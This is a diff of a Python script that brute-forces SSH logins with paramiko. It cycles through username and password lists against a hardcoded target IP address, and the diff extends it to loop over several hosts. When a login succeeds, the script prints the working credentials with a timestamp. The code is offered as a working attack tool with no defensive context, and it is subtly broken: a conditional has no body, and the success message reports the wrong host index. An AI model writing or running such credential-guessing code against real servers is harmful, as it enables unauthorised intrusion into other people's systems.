@@ -9,23 +9,24 @@ ipAddress=['184.171.153.180']
 
 def bruteforce(start,end,step):
     found=False
-    for x in range(len(usernames)):
-        for y in range(start,end,step):
-            if found==True:
-            ssh=paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            try:
-                ssh.connect(ipAddress[0],port=22,username=usernames[x],password=passwords[y])
+    for a in range(len(ipAddress)):
+        for x in range(len(usernames)):
+            for y in range(start,end,step):
+                if found==True:
+                ssh=paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                try:
+                    ssh.connect(ipAddress[a],port=22,username=usernames[x],password=passwords[y])
+                    ssh.close()
+                    print(ipAddress[0],usernames[x],passwords[y])
+                    print(datetime.now())
+                    found=True
+                    break
+                except:
+                    pass
                 ssh.close()
-                print(ipAddress[0],usernames[x],passwords[y])
-                print(datetime.now())
-                found=True
+            if found==True:
                 break
-            except:
-                pass
-            ssh.close()
-        if found==True:
-            break
 
 def makeThreads(numThreads,function,argument):
     try:
